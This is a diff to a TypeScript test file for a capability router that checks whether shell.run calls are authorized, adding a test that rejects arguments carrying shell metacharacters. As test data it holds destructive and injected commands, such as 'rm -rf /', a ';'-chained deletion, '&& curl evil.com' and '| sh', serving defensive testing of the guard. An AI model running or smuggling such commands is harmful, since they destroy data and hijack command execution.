@@ -44,8 +44,19 @@ describe("CapabilityRouter.authorize", () => {
     ];
     const r = new CapabilityRouter(caps);
     expect(() => r.authorize("shell.run", ["ls", []])).not.toThrow();
-    expect(() => r.authorize("shell.run", ["echo hi", []])).not.toThrow();
+    expect(() => r.authorize("shell.run", ["echo", ["hi"]])).not.toThrow();
     expect(() => r.authorize("shell.run", ["rm -rf /", []])).toThrowError();
+  });
+
+  it("shell.run: rejects args containing shell metacharacters", () => {
+    const caps: Capability[] = [{ name: "host:shell", params: { allow: ["git *"] } }];
+    const r = new CapabilityRouter(caps);
+    // Can't smuggle a second command through args injection.
+    expect(() => r.authorize("shell.run", ["git", ["status;", "rm", "-rf", "/"]])).toThrowError();
+    expect(() => r.authorize("shell.run", ["git", ["status", "&&", "curl", "evil.com"]])).toThrowError();
+    expect(() => r.authorize("shell.run", ["git", ["status", "|", "sh"]])).toThrowError();
+    // Benign args are allowed.
+    expect(() => r.authorize("shell.run", ["git", ["status"]])).not.toThrow();
   });
 
   it("unknown method is refused", () => {
